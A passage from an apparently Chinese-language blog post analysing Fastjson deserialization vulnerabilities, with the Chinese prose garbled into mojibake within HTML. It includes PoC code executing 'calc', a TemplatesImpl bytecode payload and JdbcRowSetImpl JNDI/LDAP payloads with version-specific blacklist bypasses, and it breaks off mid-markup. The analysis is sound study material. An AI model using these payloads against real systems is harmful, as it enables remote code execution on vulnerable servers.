·çš„ï¼Œåªä¸è¿‡ä¸åŒç‰ˆæœ¬æ˜¯é’ˆå¯¹ä¸åŒçš„é»‘åå•æˆ–è€…åˆ©ç”¨ä¸åŒåˆ©ç”¨é“¾æ¥è¿›è¡Œç»•è¿‡åˆ©ç”¨è€Œå·²ã€‚</p><p>é€šè¿‡Fastjsonååºåˆ—åŒ–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥ä¼ å…¥ä¸€ä¸ªæ¶æ„æ„é€ çš„JSONå†…å®¹ï¼Œç¨‹åºå¯¹å…¶è¿›è¡Œååºåˆ—åŒ–åå¾—åˆ°æ¶æ„ç±»å¹¶æ‰§è¡Œäº†æ¶æ„ç±»ä¸­çš„æ¶æ„å‡½æ•°ï¼Œè¿›è€Œå¯¼è‡´ä»£ç æ‰§è¡Œã€‚</p><h2 id="é‚£ä¹ˆå¦‚ä½•æ‰èƒ½å¤Ÿååºåˆ—åŒ–å‡ºæ¶æ„ç±»å‘¢ï¼Ÿ"><a href="#é‚£ä¹ˆå¦‚ä½•æ‰èƒ½å¤Ÿååºåˆ—åŒ–å‡ºæ¶æ„ç±»å‘¢ï¼Ÿ" class="headerlink" title="é‚£ä¹ˆå¦‚ä½•æ‰èƒ½å¤Ÿååºåˆ—åŒ–å‡ºæ¶æ„ç±»å‘¢ï¼Ÿ"></a>é‚£ä¹ˆå¦‚ä½•æ‰èƒ½å¤Ÿååºåˆ—åŒ–å‡ºæ¶æ„ç±»å‘¢ï¼Ÿ</h2><ol><li><p>ç”±å‰é¢demoçŸ¥é“ï¼ŒFastjsonä½¿ç”¨<code>parseObject()</code>&#x2F;<code>parse()</code>è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™å¯ä»¥æŒ‡å®šç±»å‹ã€‚å¦‚æœæŒ‡å®šçš„ç±»å‹å¤ªå¤§ï¼ŒåŒ…å«å¤ªå¤šå­ç±»ï¼Œå°±æœ‰åˆ©ç”¨ç©ºé—´äº†ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæŒ‡å®šç±»å‹ä¸ºObjectæˆ–JSONObjectï¼Œåˆ™å¯ä»¥ååºåˆ—åŒ–å‡ºæ¥ä»»æ„ç±»ã€‚ä¾‹å¦‚ä»£ç å†™<code>Object o = JSON.parseObject(poc,Object.class)</code>å°±å¯ä»¥ååºåˆ—åŒ–å‡ºObjectç±»æˆ–å…¶ä»»æ„å­ç±»ï¼Œè€ŒObjectåˆæ˜¯ä»»æ„ç±»çš„çˆ¶ç±»ï¼Œæ‰€ä»¥å°±å¯ä»¥ååºåˆ—åŒ–å‡ºæ‰€æœ‰ç±»ã€‚</p></li><li><p>å¦‚ä½•æ‰èƒ½è§¦å‘ååºåˆ—åŒ–å¾—åˆ°çš„æ¶æ„ç±»ä¸­çš„æ¶æ„å‡½æ•°å‘¢?</p><p>ç”±å‰é¢çŸ¥é“ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹è¿›è¡Œååºåˆ—åŒ–æ—¶ä¼šå°†ååºåˆ—åŒ–å¾—åˆ°çš„ç±»çš„æ„é€ å‡½æ•°ã€<code>getter</code>æ–¹æ³•ã€<code>setter</code>æ–¹æ³•æ‰§è¡Œä¸€éï¼Œå¦‚æœè¿™ä¸‰ç§æ–¹æ³•ä¸­å­˜åœ¨å±é™©æ“ä½œï¼Œåˆ™å¯èƒ½å¯¼è‡´ååºåˆ—åŒ–æ¼æ´çš„å­˜åœ¨ã€‚æ¢å¥è¯è¯´ï¼Œå°±æ˜¯æ”»å‡»è€…ä¼ å…¥è¦è¿›è¡Œååºåˆ—åŒ–çš„ç±»ä¸­çš„æ„é€ å‡½æ•°ã€<code>getter</code>æ–¹æ³•ã€<code>setter</code>æ–¹æ³•ä¸­è¦å­˜åœ¨æ¼æ´æ‰èƒ½è§¦å‘ã€‚</p></li></ol><p>æˆ‘ä»¬åˆ°<code>DefaultJSONParser.parseObject(Map object, Object fieldName)</code>ä¸­çœ‹ä¸‹ï¼ŒJSONä¸­ä»¥@typeå½¢å¼ä¼ å…¥çš„ç±»çš„æ—¶å€™ï¼Œè°ƒç”¨<code>deserializer.deserialize()</code>å¤„ç†è¯¥ç±»ï¼Œå¹¶å»è°ƒç”¨è¿™ä¸ªç±»çš„<code>setter</code>å’Œ<code>getter</code>æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">parseObject</span><span class="params">(<span class="keyword">final</span> Map object, Object fieldName)</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// JSON.DEFAULT_TYPE_KEYå³@type</span></span><br><span class="line">    <span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> config.getDeserializer(clazz);</span><br><span class="line">        <span class="keyword">return</span> deserializer.deserialze(<span class="built_in">this</span>, clazz, fieldName);</span><br></pre></td></tr></table></figure><p>æ•´ä¸ªè§£æè¿‡ç¨‹ç›¸å½“å¤æ‚ï¼ŒçŸ¥é“ç»“è®ºå°±okäº†ã€‚</p><h2 id="å°ç»“ä¸€ä¸‹"><a href="#å°ç»“ä¸€ä¸‹" class="headerlink" title="å°ç»“ä¸€ä¸‹"></a>å°ç»“ä¸€ä¸‹</h2><p>è‹¥ååºåˆ—åŒ–æŒ‡å®šç±»å‹çš„ç±»å¦‚<code>Student obj = JSON.parseObject(text, Student.class);</code>ï¼Œè¯¥ç±»æœ¬èº«çš„æ„é€ å‡½æ•°ã€<code>setter</code>æ–¹æ³•ã€<code>getter</code>æ–¹æ³•å­˜åœ¨å±é™©æ“ä½œï¼Œåˆ™å­˜åœ¨Fastjsonååºåˆ—åŒ–æ¼æ´ï¼›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String test)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;name setter called&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = test;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//å¼¹å‡ºcalc</span></span><br></pre></td></tr></table></figure><p>è‹¥ååºåˆ—åŒ–æœªæŒ‡å®šç±»å‹çš„ç±»å¦‚<code>Object obj = JSON.parseObject(text, Object.class);</code>ï¼Œè¯¥è‹¥è¯¥ç±»çš„å­ç±»çš„æ„é€ æ–¹æ³•ã€<code>setter</code>æ–¹æ³•ã€<code>getter</code>æ–¹æ³•å­˜åœ¨å±é™©æ“ä½œï¼Œåˆ™å­˜åœ¨Fastjsonååºåˆ—åŒ–æ¼æ´ï¼›</p><h2 id="PoC-å†™æ³•"><a href="#PoC-å†™æ³•" class="headerlink" title="PoC å†™æ³•"></a>PoC å†™æ³•</h2><p>ä¸€èˆ¬çš„ï¼ŒFastjsonååºåˆ—åŒ–æ¼æ´çš„PoCå†™æ³•å¦‚ä¸‹ï¼Œ@typeæŒ‡å®šäº†ååºåˆ—åŒ–å¾—åˆ°çš„ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;@type&quot;</span>:<span class="string">&quot;xxx.xxx.xxx&quot;</span>,</span><br><span class="line"><span class="string">&quot;xxx&quot;</span>:<span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…³é”®æ˜¯è¦æ‰¾å‡ºä¸€ä¸ªç‰¹æ®Šçš„åœ¨ç›®æ ‡ç¯å¢ƒä¸­å·²å­˜åœ¨çš„ç±»ï¼Œæ»¡è¶³å¦‚ä¸‹ä¸¤ä¸ªæ¡ä»¶ï¼š</p><ol><li>è¯¥ç±»çš„æ„é€ å‡½æ•°ã€<code>setter</code>æ–¹æ³•ã€<code>getter</code>æ–¹æ³•ä¸­çš„æŸä¸€ä¸ªå­˜åœ¨å±é™©æ“ä½œï¼Œæ¯”å¦‚é€ æˆå‘½ä»¤æ‰§è¡Œï¼›</li><li>å¯ä»¥æ§åˆ¶è¯¥æ¼æ´å‡½æ•°çš„å˜é‡ï¼ˆä¸€èˆ¬å°±æ˜¯è¯¥ç±»çš„å±æ€§ï¼‰ï¼›</li></ol><h2 id="æ¼æ´Demo"><a href="#æ¼æ´Demo" class="headerlink" title="æ¼æ´Demo"></a>æ¼æ´Demo</h2><p>ç”±å‰é¢æ¯”è¾ƒçš„æ¡ˆä¾‹çŸ¥é“ï¼Œå½“ååºåˆ—åŒ–æŒ‡å®šçš„ç±»å‹æ˜¯Object.classï¼Œå³ä»£ç ä¸º<code>Object obj = JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField);</code>æ—¶ï¼Œååºåˆ—åŒ–å¾—åˆ°çš„ç±»çš„æ„é€ å‡½æ•°ã€æ‰€æœ‰å±æ€§çš„<code>setter</code>æ–¹æ³•ã€propertiesç§æœ‰å±æ€§çš„<code>getter</code>æ–¹æ³•éƒ½ä¼šè¢«è°ƒç”¨ï¼Œå› æ­¤æˆ‘ä»¬è¿™é‡Œç›´æ¥åšæœ€ç®€å•çš„ä¿®æ”¹ï¼Œå°†Studentç±»ä¸­ä¼šè¢«è°ƒç”¨çš„<code>getter</code>æ–¹æ³•æ·»åŠ æ¼æ´ä»£ç ï¼Œè¿™é‡Œä¿®æ”¹<code>getProperties()</code>ä½œä¸ºæ¼”ç¤ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Properties;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line"> <span class="keyword">private</span> <span class="type">int</span> age;  </span><br><span class="line"> <span class="keyword">private</span> String address;  </span><br><span class="line"> <span class="keyword">private</span> Properties properties;  </span><br><span class="line">  </span><br><span class="line"> <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;æ„é€ å‡½æ•°&quot;</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);  </span><br><span class="line"> <span class="keyword">return</span> name;  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);  </span><br><span class="line"> <span class="built_in">this</span>.name = name;  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);  </span><br><span class="line"> <span class="keyword">return</span> age;  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//    public void setAge(int age) &#123;  </span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;setAge&quot;);  </span></span><br><span class="line"><span class="comment">//        this.age = age;  </span></span><br><span class="line"><span class="comment">//    &#125;  </span></span><br><span class="line">  </span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">getAddress</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAddress&quot;</span>);  </span><br><span class="line"> <span class="keyword">return</span> address;  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> Properties <span class="title function_">getProperties</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getProperties&quot;</span>);  </span><br><span class="line"> Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line"> <span class="keyword">return</span> properties;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>FastjsonEasyPoC.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonEasyPoC</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Student\&quot;,\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;Drunkbaby\&quot;,\&quot;address\&quot;:\&quot;china\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;</span>;  </span><br><span class="line">  </span><br><span class="line"> <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonString, Object.class);  </span><br><span class="line"> System.out.println(obj);  </span><br><span class="line"> System.out.println(obj.getClass().getName());  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾ï¼Œå‰é¢çš„Demoä¸­ååºåˆ—åŒ–çš„ç±»æ˜¯ä¸€ä¸ªObjectç±»ï¼Œè¯¥ç±»æ˜¯ä»»æ„ç±»çš„çˆ¶ç±»ï¼Œå…¶å­ç±»Studentå­˜åœ¨Fastjsonååºåˆ—åŒ–æ¼æ´ï¼Œå½“@typeæŒ‡å‘Studentç±»æ˜¯ååºåˆ—åŒ–å°±ä¼šè§¦å‘æ¼æ´ã€‚</p><p>å¯¹äºå¦ä¸€ç§ååºåˆ—åŒ–æŒ‡å®šç±»çš„æƒ…æ™¯ï¼Œæ˜¯è¯¥æŒ‡å®šç±»æœ¬èº«å°±å­˜åœ¨æ¼æ´ï¼Œæ¯”å¦‚æˆ‘ä»¬å°†ä¸Šè¿°Demoä¸­ååºåˆ—åŒ–é‚£è¡Œä»£ç æ”¹æˆç›´æ¥ååºåˆ—åŒ–å¾—åˆ°Studentç±»è€ŒéObjectç±»ï¼Œè¿™æ ·å°±æ˜¯å¦ä¸€ä¸ªè§¦å‘ä¹Ÿæ˜¯æœ€ç›´æ¥çš„è§¦å‘åœºæ™¯ï¼š</p><h2 id="æ¼æ´æ”»é˜²å²"><a href="#æ¼æ´æ”»é˜²å²" class="headerlink" title="æ¼æ´æ”»é˜²å²"></a>æ¼æ´æ”»é˜²å²</h2><ol><li><p>v1.2.24ä¹‹å‰</p><p>@typeè‡ªåŠ¨åŠ è½½ç±»</p></li><li><p>v1.2.41ä¹‹å‰ï¼Œ</p></li></ol><p>  fastjsoné»˜è®¤å…³é—­äº†autotypeæ”¯æŒï¼Œå¹¶ä¸”åŠ å…¥äº†checkAutotype ï¼ˆè¿‡æ»¤@typeé‡Œçš„å€¼ï¼Œé»‘ç™½åå•è¿‡æ»¤ï¼‰</p><p>  åŠ è½½çš„è¿‡ç¨‹ä¸­ï¼Œfastjsonæœ‰ä¸€æ®µç‰¹æ®Šçš„å¤„ç†ï¼Œé‚£å°±æ˜¯åœ¨å…·ä½“åŠ è½½ç±»çš„æ—¶å€™ä¼šå»æ‰classNameå‰åçš„Lå’Œåé¢çš„åˆ†å·;ï¼Œå½¢å¦‚Lcom.lang.Thread;    Lcom.sun.rowset.JdbcRowSetImpl;</p><ol start="3"><li><p>v1.2.42</p><p>åœ¨è¿›è¡Œé»‘ç™½åå•æ£€æµ‹çš„æ—¶å€™ï¼Œfastjsonå…ˆåˆ¤æ–­ç›®æ ‡ç±»çš„ç±»åçš„å‰åæ˜¯ä¸æ˜¯Lå’Œ;ï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œå°±æˆªå–æ‰å‰åçš„Lå’Œ;å†è¿›è¡Œé»‘ç™½åå•çš„æ ¡éªŒ LLcom.sun.rowset.JdbcRowSetImpl;; </p></li><li><p>v1.2.43</p><p>fastjsonè¿™æ¬¡åœ¨é»‘ç™½åå•åˆ¤æ–­ä¹‹å‰ï¼Œå¢åŠ äº†ä¸€ä¸ªæ˜¯å¦ä»¥LLæœªå¼€å¤´çš„åˆ¤æ–­ åœ¨ç›®æ ‡ç±»å‰é¢æ·»åŠ [ v1.2.44ç‰ˆæœ¬ä¸­ï¼Œfastjsonçš„ä½œè€…åšäº†æ›´åŠ ä¸¥æ ¼çš„è¦æ±‚ï¼Œåªè¦ç›®æ ‡ç±»ä»¥[å¼€å¤´æˆ–è€…ä»¥;ç»“å°¾ </p></li><li><p>v1.2.47 </p><p>autoTypeä¸å¼€å¯åè€Œä¼šè¢«æ”»å‡»ã€‚å› ä¸ºåœ¨fastjsonä¸­æœ‰ä¸€ä¸ªå…¨å±€ç¼“å­˜ï¼Œåœ¨ç±»åŠ è½½çš„æ—¶å€™ï¼Œå¦‚æœautotypeæ²¡å¼€å¯ï¼Œä¼šå…ˆå°è¯•ä»ç¼“å­˜ä¸­è·å–ç±»ï¼Œå¦‚æœç¼“å­˜ä¸­æœ‰ï¼Œåˆ™ç›´æ¥è¿”å›ã€‚java.lang.Classç±»å¯¹åº”çš„deserializerä¸ºMiscCodecï¼Œååºåˆ—åŒ–æ—¶ä¼šå–jsonä¸²ä¸­çš„valå€¼å¹¶åŠ è½½è¿™ä¸ªvalå¯¹åº”çš„ç±»ã€‚å¦‚æœfastjson cacheä¸ºtrueï¼Œå°±ä¼šç¼“å­˜è¿™ä¸ªvalå¯¹åº”çš„classåˆ°å…¨å±€ç¼“å­˜ä¸­</p></li><li><p>v1.2.68</p><p>åˆ©ç”¨å¼‚å¸¸è¿›è¡Œæ”»å‡»       OOMåœ¨fastjsonä¸­ï¼Œ å¦‚æœ@type æŒ‡å®šçš„ç±»ä¸º Throwable çš„å­ç±»ï¼Œé‚£å¯¹åº”çš„ååºåˆ—åŒ–å¤„ç†ç±»å°±ä¼šä½¿ç”¨åˆ° ThrowableDeserializerè€Œåœ¨ThrowableDeserializer#deserialzeçš„æ–¹æ³•ä¸­ï¼Œå½“æœ‰ä¸€ä¸ªå­—æ®µçš„keyä¹Ÿæ˜¯ @typeæ—¶ï¼Œå°±ä¼šæŠŠè¿™ä¸ª value å½“åšç±»åï¼Œç„¶åè¿›è¡Œä¸€æ¬¡ checkAutoType æ£€æµ‹ã€‚å¹¶ä¸”æŒ‡å®šäº†expectClassä¸ºThrowable.classï¼Œä½†æ˜¯åœ¨checkAutoTypeä¸­ï¼Œæœ‰è¿™æ ·ä¸€çº¦å®šï¼Œé‚£å°±æ˜¯å¦‚æœæŒ‡å®šäº†expectClass ï¼Œé‚£ä¹ˆä¹Ÿä¼šé€šè¿‡æ ¡éªŒã€‚å› ä¸ºfastjsonåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šå°è¯•æ‰§è¡Œé‡Œé¢çš„getteræ–¹æ³•ï¼Œè€ŒExceptionç±»ä¸­éƒ½æœ‰ä¸€ä¸ªgetMessageæ–¹æ³•ã€‚åªéœ€è¦è‡ªå®šä¹‰ä¸€ä¸ªå¼‚å¸¸ï¼Œå¹¶ä¸”é‡å†™å…¶getMessageå°±è¾¾åˆ°äº†æ”»å‡»çš„ç›®çš„ã€‚</p></li></ol><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h4 id="fastjson1-2-24"><a href="#fastjson1-2-24" class="headerlink" title="fastjson1.2.24"></a>fastjson1.2.24</h4><h6 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h6><ol><li><p>æ¼æ´åˆ©ç”¨é“¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.æ„é€ ä¸€ä¸ª TemplatesImpl ç±»çš„ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œå…¶ä¸­ _bytecodes æ˜¯æˆ‘ä»¬æ„é€ çš„æ¶æ„ç±»çš„ç±»å­—èŠ‚ç ï¼Œè¿™ä¸ªç±»çš„çˆ¶ç±»æ˜¯ AbstractTransletï¼Œæœ€ç»ˆè¿™ä¸ªç±»ä¼šè¢«åŠ è½½å¹¶ä½¿ç”¨ newInstance() å®ä¾‹åŒ–ã€‚</span><br><span class="line"></span><br><span class="line">2.åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œç”±äºgetteræ–¹æ³• getOutputProperties()ï¼Œæ»¡è¶³æ¡ä»¶ï¼Œå°†ä¼šè¢« fastjson è°ƒç”¨ï¼Œè€Œè¿™ä¸ªæ–¹æ³•è§¦å‘äº†æ•´ä¸ªæ¼æ´åˆ©ç”¨æµç¨‹ï¼šgetOutputProperties() </span><br><span class="line">-&gt; newTransformer()</span><br><span class="line">-&gt; getTransletInstance() </span><br><span class="line">-&gt; defineTransletClasses() / EvilClass.newInstance().</span><br></pre></td></tr></table></figure></li><li><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_bytecodes&quot;</span>: [<span class="string">&quot;yv66vgAAADQA...CJAAk=&quot;</span>],</span><br><span class="line">    <span class="string">&quot;_name&quot;</span>: <span class="string">&quot;su18&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_tfactory&quot;</span>: &#123;&#125;,</span><br><span class="line">    <span class="string">&quot;_outputProperties&quot;</span>: &#123;&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fastjson24poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//TemplatesImpl</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">byteCode</span> <span class="operator">=</span> <span class="string">&quot;xxxxxxxxxxxxxxx&quot;</span>;</span><br><span class="line">        <span class="comment">//æ„é€ TemplatesImplçš„jsonæ•°æ®ï¼Œå¹¶å°†æ¶æ„ç±»æ³¨å…¥åˆ°jsonæ•°æ®ä¸­</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+byteCode+<span class="string">&quot;\&quot;],&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;_name&#x27;:&#x27;TempletaPoc&#x27;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;_tfactory&#x27;:&#123;&#125;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;_outputProperties\&quot;:&#123;&#125;&#125;\n&quot;</span>;</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        <span class="comment">//ååºåˆ—åŒ–</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> JSON.parseObject(payload, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220828220330214.png" alt="image-20220828220330214"></p></li></ol><h6 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h6><ol><li><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="fastjson1-2-25"><a href="#fastjson1-2-25" class="headerlink" title="fastjson1.2.25"></a>fastjson1.2.25</h4><ol><li><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="fastjson1-2-42"><a href="#fastjson1-2-42" class="headerlink" title="fastjson1.2.42"></a>fastjson1.2.42</h4><ol><li><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="fastjson1-2-43"><a href="#fastjson1-2-43" class="headerlink" title="fastjson1.2.43"></a>fastjson1.2.43</h4><ol><li><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span 